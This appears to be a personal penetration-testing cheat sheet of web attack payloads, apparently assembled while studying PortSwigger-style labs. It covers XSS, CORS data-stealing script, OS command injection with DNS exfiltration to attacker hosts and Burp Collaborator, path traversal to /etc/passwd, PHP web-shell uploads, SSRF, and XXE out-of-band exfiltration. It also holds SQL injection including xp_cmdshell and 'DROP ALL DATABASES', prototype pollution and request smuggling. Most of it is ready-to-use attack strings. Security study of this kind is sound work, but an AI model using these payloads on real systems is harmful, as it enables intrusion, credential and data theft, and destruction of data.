testing start





unvalidate redirect  

                                                  
                                                  open redirect 
                                                  
                                                  use google dorks 
                                                  
                                                  
                                                  inurl:%3Dhttp site:example.com
                                                  
                                                  inurl:%3D%2F site:example.com
                                                  
                                                  inurl:redir site:example.com
                                                  inurl:redirect site:example.com
                                                  Open Redirects   135
                                                  inurl:redirecturi site:example.com
                                                  inurl:redirect_uri site:example.com
                                                  inurl:redirecturl site:example.com
                                                  inurl:redirect_uri site:example.com
                                                  inurl:return site:example.com
                                                  inurl:returnurl site:example.com
                                                  inurl:relaystate site:example.com
                                                  inurl:forward site:example.com
                                                  inurl:forwardurl site:example.com
                                                  inurl:forward_url site:example.com
                                                  inurl:url site:example.com
                                                  inurl:uri site:example.com
                                                  inurl:dest site:example.com
                                                  inurl:destination site:example.com
                                                  inurl:next site:exampl
                                                  
                                                  Bypass validation
                                                  
                                                  https://example.com/login?redir=http://example.com.attacker.com
                                                  https://example.com/login?redir=http://attacker.com/example.com
                                                  
                                                  Double Encoding
                                                  
                                                  First, try to double- or triple-URL-encode certain special characters in your
                                                  payload. For example, you could URL-encode the slash character in https://
                                                  example.com/@attacker.com. Here is the URL with a URL-encoded slash:


IDOR
exposing API key
excessive data exposure
lack of rate limiting
authorization bugs
mass assignment
secuirty misconfiguration - server headers                          ALLWAYS TRY TO ENCODE THE INPUT TO BYPASS VALIDATION
injection
bussiness logic vuln
verbose errors
directory traversal fuzzing
test web vulns
xss
sqli
command inj



api
v1
v2
swaggger
dev
api bruteforce

http 0.9 1.0 1.1 2.0 3.0 

ssl 1.0 2.0 3.0


GET /ANIL/test?redirect=google.com HTTP/1.1


csp if implemented using Meta TAGS vilation reports wil not be sent, vilation reports will be sent only when impleted throught headers .




Always check console 

check robots.txt
direct access to url like /Admin



                                                         Testing starts





                             1. burp proxy history 
                             2. Target Scope > site map
                             3. select any request > engagement tools > content discovery 
                             4. Developer tools extension for hidden input 
                             5. Nmap
                             6. Wfuzz 
                             7. hakrawler - modify to autocrawl everyday (crawl and save output in a file, crawl nextday and find differenece in both files report if there are any new changes)
                             8. tomnonmnom - wayback urls 
                             9. intruder long (check in pro )
                             10. web shells 

                                         https://github.com/d4t4s3c/Offensive-Reverse-Shell-Cheat-Sheet
                                         https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html
                            11. xss

                                                     DOM - it's a web browesrs hireracheal represtation of the elements on a page, developers use javascript to manipulate nodes & elements of the dom. When a website containing javascript takes the user controllable value know as source and pass it to dangerous function known as sink, 

                                                     A source is a javascript property that accepts attacker controlled data like location.search, document.cookie & document.referrer      
                                                     
                                                     eval() function is a sink because it process the data passed to it as javascript document.body.innerHTML because it potentially allows attacker to inject HTMl and execute arbitary javascript    


                                                     https://michaelhidalgo.medium.com/on-flask-semgrep-and-secure-coding-26290fcdd960     


                                                           SEMGREP       



                                                    build a semgrep tool


                                                    <tag> event=onerror onload

                                                    search=<xss+id=x+onfocus=alert(document.cookie) tabindex=1>#x';
                                                    search=<svg><a><animate+attributeName=href+values=javascript:alert(1)+/><text+x=20+y=20>Click me</text></a>


                                                    research more

                                                    1. XSS between HTML tags - 

                                                             When the XSS context is text between HTML tags, you need to introduce some new HTML tags designed to trigger execution of JavaScript. 

                                                                    <h1>haikupayload</h1>
                                                                         <script>alert(document.domain)</script>
                                                                         <img src=1 onerror=alert(1)>




                                                    2. XSS in HTML tag attributes -

                                                         When the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one.

                                                                 <h1> <input type=text placeholder='Search the blog...' name=search value="haikupayload"> </h1>
                                                                     " autofocus onfocus=alert(document.domain) x="


                                                         Sometimes the XSS context is into a type of HTML tag attribute that itself can create a scriptable context. Here, you can execute JavaScript without needing to terminate the attribute value. For example, if the XSS context is into the href attribute of an anchor tag, you can use the javascript pseudo-protocol to execute script. For example: 

                                                                        javascript:alert(1)

                                                        hidden & canonical which dont fire automatically

                                                                     <link rel="canonical" accesskey="X" onclick="alert(1)" />





                                                    3. XSS into JavaScript -


                                                        i. Terminating the existing script

                                                                     <script> var=haiku </script> 
                                                                            payload :- </script><img src=1 onerror=alert(document.domain)>


                                                        ii. Breaking out of script

                                                                 In cases where the XSS context is inside a quoted string literal, it is often possible to break out of the string and execute JavaScript directly. It is essential to repair the script following the XSS context, because any syntax errors there will prevent the whole script from executing.


                                                                        '-alert(document.domain)-'
                                                                        ';alert(document.domain)//


                                                        iii. Escaping sting terminator

                                                                escaping any single quote characters with a backslash


                                                                     For example, suppose that the input:
                                                                            ';alert(document.domain)//

                                                                            gets converted to:
                                                                            \';alert(document.domain)//

                                                                            You can now use the alternative payload:
                                                                            \';alert(document.domain)//

                                                                            which gets converted to:
                                                                            \\';alert(document.domain)//




                                                         iv.  HTML encoded & escaped


                                                                \'-alert(1)//
                                                                onerror=alert;throw 1



                                                         v.  Making use of HTML-encoding


                                                               When the XSS context is some existing JavaScript within a quoted tag attribute, such as an event handler, it is possible to make use of HTML-encoding to work around some input filters.


                                                                    <a href="#" onclick="... var input='controllable data here'; ...">

                                                                            &apos;-alert(document.domain)-&apos;

                                                                            http://foo?&apos;-alert(1)-&apos;



                                                         vi.  JavaScript template literals

                                                                    ${alert(document.domain)}
                                                                    ${alert(1)}



                                                                    Client side template injection
                                                                    dangling markup


                                                                  https://portswigger.net/research/one-xss-cheatsheet-to-rule-them-all

                                                  xss bypass
                                                  
                                                  instead of <script> use alternative like img or javascript:alert
                                                  
                                                  
                                                  captilization and encoding
                                                  
                                                  ScrIpT
                                                  base64 encode utf-8 or unicode 
                                                  
                                                  Use script twice <script><script>alert(1)</script>



                            
                            13. CORS


                                                                SOP 


                                                        It generally allows a domain to issue requests to other domains, but not to access the responses. 

                                                        And that is where XSS comes into play. It essentially allows bypassing of the SOP, because now an attacker can execute their script from the same origin as the application (eg facebook.com).


                                                        Access-Control-Allow-Credentials: true
                                                         Without that header, the victim user's browser will refuse to send their cookies, meaning the attacker will only gain access to unauthenticated content, which they could just as easily access by browsing directly to the target website.


                                                         not permitted


                                                         Access-Control-Allow-Origin: *
                                                         Access-Control-Allow-Credentials: true

                                                         Access-Control-Allow-Origin: https://*.normal-website.com

                                                        https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
                                                        
                                                        
                                                        <script>
                                                           var req = new XMLHttpRequest();
                                                           req.onload = reqListener;
                                                           req.open('get','https://account-sprint.dynatracelabs.com//my/api/v1/static/resource-mappings',true);
                                                           req.withCredentials = true;
                                                           req.send();
                                                        
                                                           function reqListener() {
                                                               location='/log?key='+this.responseText;
                                                           };
                                                        </script> 



                            14. click jacking
                            15. web sockets 
                            16. CSRF 

                                                                    . Change to GET 
                                                                    . remove token from the request
                                                                    . token not tied to user session application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool.

                                                                consider requesting <img> which is available after authentication from another site in the same browser 

                                                                Samesite = strict

                                                                        Will not allow cross site requests to include cookie even when following a link like href or embedd

                                                                        <a>
                                                                        <ifame>
                                                                        <script>


                                                                Samesite = Lax

                                                                        Will allow cross site requests to include cookie only when following a link 
                                                                        


                                                        
                                                                Samesite = None ; secure

                                                                            if none is mentioned Secure should be used.

                                                                If samesite is not set; browser will consider as Samesite = Lax but will not show in developer tools in chrome 80+





                                                                          "same-site" vs "same-origin"


                                                            When we look at the details of SameSite cookies, we're going to be dealing a lot with the concept of "same-site" and "cross-site" requests. This is similar to another phrase you may have heard, "cross-origin" requests, but they are subtly different.

                                                          


                                                            In summary, two URLs are considered to be "same-site" if they:

                                                                Have the same scheme i.e. http or https
                                                                Have the same domain i.e. example.com, andrewlock.net or microsoft.com

                                                            They don't need to have the same port or subdomain.

                                                            Two URLs are considered to be "same-origin" if they

                                                                Have the same scheme i.e. http or https
                                                                Have the same domain i.e. example.com, andrewlock.net or microsoft.com
                                                                Have the same subdomain i.e. www.
                                                                Have the same port (which may be implicit) i.e. port 80 for http and 443 for https

                                                            If we use the URL http://www.example.org and compare against variations, you can see the difference more clearly.




                                                            If we use the URL http://www.example.org and compare against variations, you can see the difference more clearly.


                                                                  URL                       Description                       same-site      same-origin

                                                            http://www.example.org          Identical URL                        ✅               ✅
                                                            http://www.example.org:80       Identical URL (implicit port)        ✅               ✅
                                                            http://www.example.org:8080     Different port                       ✅               ❌
                                                            http://sub.example.org          Different subdomain                  ✅               ❌
                                                            https://www.example.org         Different scheme                     ❌               ❌
                                                            http://www.example.evil          Different TLD                       ❌               ❌



                                                            https://andrewlock.net/understanding-samesite-cookies/



                                                            some applications do not maintain any server-side record of tokens that have been issued, but instead duplicate each token within a cookie and a request parameter. When the subsequent request is validated, the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie. This is sometimes called the "double submit" defense against CSRF, and is advocated because it is simple to implement and avoids the need for any server-side state: 

                                                    
                                                      
                                                      samesite : strict or lax - csrf not possible - it wont send cookie for cross site request - top level navigation
                                                      
                                                      but still possible it state change happens using GET method
                                                      
                                                      https://email.example.com/password_change?new_password=abc123.
                                                      
                                                      
                                                      you might explicitly set SameSite on a session cookie to None, allowing the sending of the cookie
                                                      across origins, so traditional CSRF attacks would still work.
                                                      
                                                      
                                                      delete the token
                                                      
                                                      use random token
                                                      
                                                      use pool token
                                                      
                                                      
                                                      double submit cookie - bypass - session fixation
                                                      
                                                      Sites also commonly use a double-submit cookie as a defense against CSRF. In
                                                      this technique, the state-changing request contains the same random token
                                                      as both a cookie and a request parameter, and the server checks whether
                                                      the two values are equal. 
                                                      
                                                      POST /password_change
                                                      Host: email.example.com
                                                      Cookie: session_cookie=YOUR_SESSION_COOKIE; csrf_token=871caef0757a4ac9691aceb9aad8b65b
                                                      (POST request body)
                                                      new_password=abc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b
                                                      
                                                      
                                                      
                                                      
                                                      csrf + xss



                            17. Access control



                                                            check robots.txt
                                                            direct access to url like /Admin
                                                            check javascript
                                                            check cookie manipulation -- admin=true; role=1 
                                                            response manipulation
                                                            study request & response indepth / modify request based on response parameters
                                                            check the correct syntax of the payload
                                                            GET to POST
                                                            check hidden fields
                                                            X-Original-URL: /admin

                                                                                    query string goes in url
                                                                                    url should be /
                                                            /ADMIN/DELETEUSER --> /admin/deleteUser

                                                            /admin/deleteUser.anything --> /admin/deleteUser

                                                            /admin/deleteUser -- >  /admin/deleteUser/

                                                            read whole response for every request for sensitive info 

                                                            Multistep Access control - directly try to access last step of the flow 

                                                            modify referrer header 

                            18. OS Command Injection


                                                            Many instances of OS command injection are blind vulnerabilities.

                                                            & echo aiwefwlguh &
                                                            |whoami
                                                            uname -a 
                                                            ifconfg
                                                            netstat -an 
                                                            ps -ef 
                                                            ;ls
                                                            ;pwd

                                                            & ping -c 10 127.0.0.1 &

                                                            x||ping+-c+10+127.0.0.1||

                                                            & whoami > /var/www/static/whoami.txt &

                                                            ||whoami>/var/www/images/output.txt||  --> filename=output.txt  you need to request the file from an endpoint which will fetch the file

                                                            & nslookup kgji2ohoyw.web-attacker.com &

                                                            & nslookup `whoami`.kgji2ohoyw.web-attacker.com &

                                                            ||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||


                                                                &
                                                                &&
                                                                |
                                                                ||
                                                                ;
                                                                ;whoami;ls &&whoami |whoami ||whoami
                                                                
                                                                & ping -c 10 127.0.0.1 & 
                                                                & whoami > /var/www/static/whoami.txt & 
                                                                
                                                                Purpose of command 	   Linux 			Windows
                                                                Name of current user 	whoami 			whoami
                                                                Operating system 		uname -a 		ver
                                                                Network configuration 	ifconfig 		ipconfig /all
                                                                Network connections 	netstat -an 	netstat -an
                                                                Running processes 		ps -ef 			tasklist 
                                                                
                                                                & nslookup kgji2ohoyw.web-attacker.com & 





                            19. Information Disclosure


                                                            /robots.txt
                                                            /sitemap.xml
                                                            Directory listings
                                                            Developer comments
                                                            Error messages
                                                            productId=13 --> productId="example"
                                                            /cgi-bin/phpinfo.php
                                                            backup files 



                                                            interactsh

                                        
                            20. Path traversal




                                                            /loadImage?filename=218.png
                                                            ../../../ -->  /etc/passwd (absolute path)
                                                            ....//....//....//etc/passwd
                                                            url encoding or url double encoding 
                                                            unicode
                                                            base64
                                                            hex
                                                            UTF 
                                                            /var/www/images/../../../etc/passwd
                                                            ../../../etc/passwd%00.png
                                                            filename=../../../etc/passwd 
                                                            
                                                            ..\..\..\windows\win.ini
                                                            ..%c0%af or ..%252f, to bypass the input filter. 
                                                            ../../../etc/passwd%00.png 
                                                            ....//....//....//etc/passwd

                                                            
                            21. file upload


                                                            <?php echo file_get_contents('/home/carlos/secret'); ?>
                                                            Content-Type to image/jpeg
                                                            <?php echo system($_GET['command']); ?>
                                                            Content-Disposition: form-data; name="avatar"; filename="../exploit.php"

                                                             Change the value of the filename parameter to .htaccess.
                                                             Change the value of the Content-Type header to text/plain.

                                                             Replace the contents of the file (your PHP payload) with the following Apache directive:
                                                             AddType application/x-httpd-php .l33t

                                                             exploit.php.jpg
                                                             exploit.asp;.jpg
                                                             exploit.asp%00.jpg
                                                             exploit%2Ephp
                                                             exploit.p.phphp
                                                             filename="exploit.php%00.jpg
                                                             ExifTool
                                                             OPTIONS method


                            22. SSRF


                                                             which calls any url or resource 
                                                             http://localhost/admin
                                                             127.0.0.1
                                                             2130706433
                                                             017700000001
                                                             127.1
                                                             URL encoding or case variation.


                                                              stockApi=http://localhost/admin 
                                                              stockApi=http://192.168.0.68/admin 
                                                              Using an alternative IP representation of 127.0.0.1, such as 2130706433, 017700000001, or 127.1. 
                                                              GET /api/web_resource/url?q=http://0:6000/ HTTP/1.1
                                                              http://[0:0:0:0:0:ffff:127.0.0.1]
                                                              Double-URL encode the # to %2523
                                                              Change the URL to http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
                                                              <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]> 
                                                              https://www.youtube.com/watch?v=eW4QDUytHrY --  useragent:  () { :; }; /usr/bin/nslookup $(whoami).YOUR-SUBDOMAIN-HERE.burpcollaborator.net referer: http://192.168.0.1:8080
                                                              
                                                              <?php
                                                              header("Location: http://localhost:25");
                                                              ?>

                                               ssrf bypass                 
                                                                octal encoding
                                                                hex encoding
                                                                decimal representation


                            23. XXE 



                                                            PARAMETER ENTITIES


                                                            Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead. XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD.


                                                            <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>

                                                            <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">

                                                            %exfil

                                                            &#x25; = % in XML (to bypass filters)





                                                            In certain parsers such as Java's SAX JAXB parser, it is possible to perform directory listing. 
                                                            <!DOCTYPE root [ <!ENTITY lastname SYSTEM "file:///" > ]><employee id="1"><name>Amy &lastname;</name><salary>6000.0</salary></employee>



                                                              XINCLUDE -  
                                                              

                                                               <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>


                                                               SVG / DOCX 
                                                             file upload 


                                                             <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>



                                                            https://github.com/lc/230-OOB
                                                            https://github.com/HLOverflow/XXE-study
                                                            https://academy.ranakhalil.com/courses/2459938/lectures/52042506
                                                            harsh botra xxe
                                                      RCE PHP -  https://www.depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection/

                                                             https://academy.ranakhalil.com/p/web-security-academy-video-series
                                                          synack blogs
                                                          https://blog.zsec.uk/out-of-band-xxe-2/
                                                          https://blog.zsec.uk/blind-xxe-learning/
                                                          https://honoki.net/2018/12/12/from-blind-xxe-to-root-level-file-read-access/
                                                          https://bookgin.tw/2018/12/03/from-xxe-to-rce-pwn2win-ctf-2018-writeup/
                                                          https://github.com/BuffaloWill/oxml_xxe
                                                          https://github.com/c0ny1/xxe-lab/tree/master
                                                          https://gosecure.github.io/
                                                            run requirements.txt


                         24. Business logic vulnerabilities
                         

                                                             "business logic" simply refers to the set of rules that define how the application operates.


                                                        1. While adding to cart 
                                                        2. negative values
                                                        3. anything@your-email-id.web-security-academy.net
                                                        4. Remove parameters
                                                        5. try parameter pollution
                                                        6. Skip to /my-account
                                                        7. drop the validation request
                                                        8. encryption oracle 



                        25. Authentication  

                                                        2FA - directly access /my-account 
                                                        Cookie: account=carlos
                                                        auth bypass
                                                        
                                                        directly access the /home endpoint without /login page
                                                        


                                                        OAUTH


                        26. API 

                                                        parameter pollution



                        27. SQLI

                                                        Most SQL injection vulnerabilities occur within the WHERE clause of a SELECT query.
                                                        
                                                        In UPDATE statements, within the updated values or the WHERE clause.
                                                        In INSERT statements, within the inserted values.
                                                        In SELECT statements, within the table or column name.
                                                        In SELECT statements, within the ORDER BY clause.

                                                                        1. login based - http://testphp.vulnweb.com/login.php


                                                          CREATE DATABASE DB1;
                                                          use db2;
                                                          CREATE TABLE users;(code)
                                                          INSERT INTO users (id,email,password) values(1,'admin@test.com,'admin')
                                                          select * from users;
                                                          select * from users where id=1;



1. error based
2. union based

3. Blind 

   1. boolean based
   2. time based
   3. out of band
4. second order 



Most SQL injection vulnerabilities occur within the WHERE clause of a SELECT query. Most experienced testers are familiar with this type of SQL injection



 However, SQL injection vulnerabilities can occur at any location within the query, and within different query types. Some other common locations where SQL injection arises are:

    In UPDATE statements, within the updated values or the WHERE clause.
    In INSERT statements, within the inserted values.
    In SELECT statements, within the table or column name.
    In SELECT statements, within the ORDER BY clause.


    https://insecure-website.com/products?category=Gifts'--
    https://insecure-website.com/products?category=Gifts'+OR+1=1--
    https://insecure-website.com/products?category='+OR+1=1--

    submitting the username administrator'-- and a blank password



       Error Based SQLI 


    Union Based - https://portswigger.net/web-security/sql-injection/union-attacks


     When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the UNION keyword to retrieve data from other tables within the database. This is commonly known as a SQL injection UNION attack. 




     Determining the number of columns required


     ' ORDER BY 1--
     ' ORDER BY 2--
     ' ORDER BY 3--    

      ' UNION SELECT NULL--
      ' UNION SELECT NULL,NULL--
      ' UNION SELECT NULL,NULL,NULL--
      ' UNION SELECT NULL,'qwqw',NULL--

      ' UNION SELECT 1,2,3--
      ' UNION SELECT 2--
      ' UNION SELECT 3--





http://testphp.vulnweb.com/artists.php?artist=-2%20UNION%20SELECT%201,table_name,3%20FROM%20infromation_schema.tables%20where%20table_schema=database()
http://testphp.vulnweb.com/artists.php?artist=-1%20union%20select%201,table_name,3%20FROM%20information_schema.tables%20where%20table_schema=database()



                                                      error based blind / Double query injection ( use when no return but only as errors)



we can use AND/OR if comments are blocked ' UNION SELECT 1,2,3 AND '1
                                          ' UNION SELECT 1,2,3 AND 1='1

' UNION SELECT 1,2,     3 AND '1  --  will always return a true statement and hence will print 1 




 
while injecting in webapp use peranthesis

select database();
select (select database());
select concat(select database());
select concat(0x3a,(select database()),0x3a);
select concat(0x3a,(select database()),0x3a, floor(rand()*2));
select concat(0x3a,(select database()),0x3a, floor(rand()*2)a;
select concat(0x3a,(select database()),0x3a, floor(rand()*2)) from information_schema.tables; 
select concat(0x3a,(select database()),0x3a, floor(rand()*2)) from information_schema.columns; 
select count(*), concat(0x3a,(select database()),0x3a), floor(rand()*2)) from information_schema.columns;
select count(*), concat(0x3a,(select version()),0x3a, floor(rand()*2))a from information_schema.columns;
select count(*), concat(0x3a,(select table_name from information_schema.tables where table_schema=database()),0x3a, floor(rand()*2))a from information_schema.columns;
select count(*), concat(0x3a,(select table_name from information_schema.tables where table_schema=database()),0x3a, floor(rand()*2))a from information_schema.columns group by a;
select 1 from (select count(*), concat(0x3a,(select table_name from information_schema.tables where table_schema=database()),0x3a, floor(rand()*2))a from information_schema.columns group by a)b;
select 1 from (select count(*), concat(0x3a,(select column_name from information_schema.columns where table_name='users' limit 6,1),0x3a, floor(rand()*2))a from information_schema.columns group by a)b;
select 1 from (select count(*), concat(0x3a,(select password from users),0x3a, floor(rand()*2))a from information_schema.columns group by a)b;


1'\")
1'
1\
1'    --+

1' AND  --+

1' AND (select count(*), concat(0x3a,(select database()),0x3a, floor(rand()*2)) from information_schema.columns group by a) --+

1' AND (select 1 from(select count(*), concat(0x3a,(select database()),0x3a, floor(rand()*2)) from information_schema.columns group by a)) --+
1' AND (select 1 from(select count(*), concat(0x3a,(select database()),0x3a, floor(rand()*2)) from information_schema.columns group by a)b) --+
1' AND (select 1 from(select count(*), concat(0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a, floor(rand()*2)) from information_schema.columns group by a)b) --+






select 1 from (select count(*), concat(0x3a,(select column_name from information_schema.columns where table_name='users'),0x3a,floor (rand()*2))a from information_schema.columns group by a)b;






                                                                        blind boolean based

1' 
1' --+
1' AND 0 --+
1' AND 1 --+

1' AND   1 > 10    --+

1' AND   (ascii(substr((select database()),3,1))) = 99 --+

1' AND   (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1))) = 99 --+




                                                                     TIME Based


1' and sleep(10)--+

select if ((select version()) like "13%", sleep(10), null);
while injecting in webapp use peranthesis  (select if ((select version()) like "13%", sleep(10), null);)
select if ((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)='e', like "13%", sleep(10), null); - like might also work
select if ((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)='e', sleep(10), null);




                                                                     out file



1'    --+
1')   --+
1'))  --+
select * from users into outfile "/tmp/test.txt"
select * from users into dumpfile "/tmp/test.txt"
select load_file("/etc/passwd");
select load_file("/etc/passwd") into outfile "/tmp/eee";
artists.php?artist=-1 union select 1,2,3 into outfile "/hj/var/www/test1.txt" --+
artists.php?artist=-1 union select 1,database(),version() into outfile "/hj/var/www/test1.txt" --+
artists.php?artist=-1 union select 1,table_name,3 from information_schema.tables into outfile "/hj/var/www/test1.txt" --+
artists.php?artist=-1 union select 1,username,password from users into outfile "/hj/var/www/test1.txt" --+





                                                            Error based double quotes / login page / post parameter - ( only when error is visible on screen )


")    #

")  1=1 # 

")  or 1 # 

")  1=1  LIMIT 3,1  #  

")   ORDER BY 2 #

")  UNION SELECT 1,2   #

")  UNION SELECT DATABASE(), version()  #

so on ....





                                                         Where clause of UPDATE query / double query injection

check in password feild '  

admin
'

admin
'  or 1=1 #



                                                                         User agent field / Insert query 




'
"
\

'  or '1'='1

error based sqli 

                                                                        cookie based sqli 



fire bug / tamper data / foxy proxy / developer tools extn / hack bar 

'
"
\

' or 1=1 #

' order by 1


error based sqli 

' union select 1,2,3 #

' union select 1,database(),3 #

error based sqli 




                                                                     second order sqli 



signup
admin' --
1234


update password

asdf
asdf

admin user password will be updated consideing admin' --






                                                                  bypass filter


OR filter - use ||

AND filter - use &&  use url encode      1' %26%26 1=0 --+   

space filter -  %A0 also ()

3') AND  %0a ('1

3')%0a unIon %0a SeLecT (1),(2),(3)%0aAND  %0a ('1


                                                                  HTTP Parameter pollution

you can try waf bypass using HPP waf will not validate extra parameter we have added and we can inject there

index.php?id=1&id=8  - diffent in jsp & php





enode to various encoding scheme

'  to some wierd character in UTF-16, utf-32,%bf%27,%af%27


1'"
'XOR(if(now()=sysdate(),sleep(10*5),0))OR'

'--
?id=1\
admin--



' or 1=1--

vanilla

and true /false
1' and 1=1 , 1=2 --+

sleep(10)--

33; DECLARE @command varchar(255); SELECT @command='ping zknivz9q0j7isvd5izssm4i1xs3kr9.burpcollaborator.net'; EXEC Master.dbo.xp_cmdshell @command; EXEC sp_SYS_ProtoOp @id=3

33; DECLARE @filename varchar(255); SELECT @filename='\\'+master.sys.fn_varbintohexstr(convert(varbinary,SYSTEM_USER))+'.xyy334me3sujnqmbzw913bw5815gwmmab.burpcollaborator.net\ohno'; EXEC Master.dbo.xp_fileexist @filename; EXEC sp_SYS_ProtoOp @id=3"

(select(0)from(select(sleep(25)))v)

union based
error based
boolean based
time 
oob

; DROP ALL DATABASES;

';--

'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'-- 

 And 1 = sleep(2);--
 
 x'||pg_sleep(10)--
 
 UNION (SELECT 1,2,3 FROM dual);--%';
 
 UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM INFORMATION_SCHEMA.TABLES);--



order by 1,2,3 && UNION SELECT NULL-- -- to know no.of columns
union select ----- to know which column is vulnerable
 UNION SELECT NULL,'a',NULL,NULL-- -- to know compatable data type



                                                                  Prototype pollution



XSS

first check js files used in debugger/source - developer tools

try in URL -   /?__proto__[foo]=bar

in console - Object.prototype 





serverside


privilege escalation

{
   
   "some value" : "123"
   "some value2" : "345"
   "foo" : "bar"
   "__proto__" :{
   "isAdmin" :true
   }

}


status code override

{
   
   "some value" : "123"
   "some value2" : "345"
   "__proto__" :{
   "status : 555
   }

}




json space - check burp raw , if it doesn't have space try this . if then if is having space it is vunlerable .


{
   
   "some value" : "123"
   "some value2" : "345"
   "__proto__" :{
   "json spaces" :100
   }

}



charset overide -  country value should be US if prototype pollution exists



{
   
   "some value" : "123"
   "some value2" : "345"
   "country": "+AFU-+AEs-"
   "__proto__" :{
   "content-type" : "application/json; charset=utf-7" 
   }

}





validation bypass




{
   
   "some value" : "123"
   "some value2" : "345"
   "constructor":{
   "prototype" :{
   "polluted" :true
   }
   }

}





data exfiltration & RCE 


check hacktricks





                                                            JWT Attacks





                                                         HTTP request smuggling 


   However, many websites have an HTTP/2-speaking front-end server, but deploy this in front of back-end infrastructure that only supports HTTP/1. This means that the front-end effectively has to translate the requests it receives into HTTP/1. This process is known as HTTP downgrading.
   



                          
                          
                             CL.TE
                          
                          
                          
                             POST / HTTP/1.1
                          
                          
                             Content-Length: 8
                          Transfer-Encoding: chunked
                          
                          0
                          
                          G
                          \r\n\r\n
                          
                          
                          
                          
                          TE.CL
                          
                          
                          POST / HTTP/1.1
                          
                          Content-Length: 3
                          Transfer-Encoding: chunked
                          
                          8
                          SMUGGLED
                          0
                          \r\n\r\n
                          
                          
                          
                          
                          
                          TE.TE
                          
                          
                          Transfer-Encoding: chunked
                          Transfer-encoding: cow
                          
                          5c
                          GPOST / HTTP/1.1
                          Content-Type: application/x-www-form-urlencoded
                          Content-Length: 15
                          
                          x=1
                          0
                          
                          
                          
                          
                          
                          
                          
                          Identifying
                          
                          
                          
                          Time delay
                          
                          
                          CL.TE
                          
                          POST / HTTP/1.1
                          Host: vulnerable-website.com
                          Transfer-Encoding: chunked
                          Content-Length: 4
                          
                          1
                          A
                          X
                          
                          
                          
                          
                          
                           Since the front-end server uses the Content-Length header, it will forward only part of this request, omitting the X. The back-end server uses the Transfer-Encoding header, processes the first chunk, and then waits for the next chunk to arrive. This will cause an observable time delay. 
                          
                          
                          
                          
                          
                          
                          
                          TE.CL
                          
                          
                          
                          POST / HTTP/1.1
                          Host: vulnerable-website.com
                          Transfer-Encoding: chunked
                          Content-Length: 6
                          
                          0
                          
                          X
                          
                          
                          
                          
                           Since the front-end server uses the Transfer-Encoding header, it will forward only part of this request, omitting the X. The back-end server uses the Content-Length header, expects more content in the message body, and waits for the remaining content to arrive. This will cause an observable time delay. 
                          
                          
                          
                          
                          
                          
                          
                          
                          Confirming
                          
                          
                          
                          CL.TE
                          
                          
                          
                          POST /search HTTP/1.1
                          Host: vulnerable-website.com
                          Content-Type: application/x-www-form-urlencoded
                          Content-Length: 49
                          Transfer-Encoding: chunked
                          
                          e
                          q=smuggling&x=
                          0
                          
                          
                          GET /404 HTTP/1.1
                          Foo: x
                          
                          If the attack is successful, then the last two lines of this request are treated by the back-end server as belonging to the next request that is received. This will cause the subsequent "normal" request to look like this:
                          GET /404 HTTP/1.1
                          Foo: xPOST /search HTTP/1.1
                          Host: vulnerable-website.com
                          Content-Type: application/x-www-form-urlencoded
                          Content-Length: 11
                          
                          q=smuggling
                          
                          Since this request now contains an invalid URL, the server will respond with status code 404, indicating that the attack request did indeed interfere with it. 
                          
                          
                          
                          
                          
                          Confirming TE.CL vulnerabilities using differential responses
                          
                          To confirm a TE.CL vulnerability, you would send an attack request like this:
                          POST /search HTTP/1.1
                          Host: vulnerable-website.com
                          Content-Type: application/x-www-form-urlencoded
                          Content-Length: 4
                          Transfer-Encoding: chunked
                          
                          7c
                          GET /404 HTTP/1.1
                          Content-Type: application/x-www-form-urlencoded
                          Content-Length: 144
                          
                          x=
                          0
                          \r\n\r\n
                          
                          
                          
                          
                          
                          
                          
                          
                          
                                                                                   Exploiting 
                          
                          
                          
                          Accessing Admin Panel
                          
                          
                          
                          POST /home HTTP/1.1
                          Host: vulnerable-website.com
                          Content-Type: application/x-www-form-urlencoded
                          Content-Length: 62
                          Transfer-Encoding: chunked
                          
                          0
                          
                          GET /admin HTTP/1.1
                          Host: vulnerable-website.com
                          Foo: xGET /home HTTP/1.1
                          Host: vulnerable-website.com
                          
                          
                          
                          
                          
                          Frontend rewriting
                          
                          
                          XSS

                        28. Race condition

                        29. NO-SQL 


                                                        '
                                                        Gifts'+'
                                                        Gifts' && 0 && 'x
                                                        Gifts' && 1 && 'x
                                                        Gifts%27%7C%7C1%7C%7C%27
                                                        category=fizzy'%00
                                                        /lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00


                                                        '\"`{\r;$Foo}\n$Foo \\xYZ\u0000
                                                        category == '''
                                                        category == '\''
